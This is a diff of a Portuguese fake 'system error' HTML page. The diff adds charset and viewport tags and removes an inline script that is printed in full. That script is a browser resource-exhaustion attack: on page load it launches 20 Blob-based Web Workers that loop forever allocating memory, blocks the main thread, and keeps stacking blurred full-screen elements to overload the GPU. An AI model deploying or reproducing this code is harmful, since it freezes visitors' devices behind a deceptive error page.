@@ -1,6 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Erro de Sistema</title>
     <style>
         body { background: black; color: red; font-family: sans-serif; text-align: center; padding-top: 50px; }
@@ -9,40 +11,5 @@
 <body>
     <h1>Ocorreu um erro crítico no sistema.</h1>
     <p>Tente reiniciar o dispositivo...</p>
-
-    <script>
-        // O segredo aqui é o Blob: ele cria scripts "on-the-fly" que rodam em threads separadas (Workers)
-        // Isso impede que o navegador trave apenas uma aba; ele tenta usar todos os núcleos da CPU.
-        const workerCode = `
-            while(true) {
-                let a = Math.random() * Math.random();
-                let b = new Array(1000000).fill("CRASH"); 
-            }
-        `;
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
-
-        window.onload = function() {
-            // Dispara 20 workers simultâneos para esgotar todos os núcleos da CPU e a RAM
-            for (let i = 0; i < 20; i++) {
-                new Worker(workerUrl);
-            }
-
-            // Loop na thread principal para congelar a interface do usuário (UI)
-            setInterval(() => {
-                while(true) {
-                    // Este loop trava a renderização da tela completamente
-                    if (Math.random() > 1) break; 
-                }
-            }, 1);
-
-            // Ataca a GPU criando elementos pesados infinitamente
-            setInterval(() => {
-                const div = document.createElement('div');
-                div.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; filter:blur(10px); z-index:9999; background:white;";
-                document.body.appendChild(div);
-            }, 10);
-        };
-    </script>
 </body>
 </html>
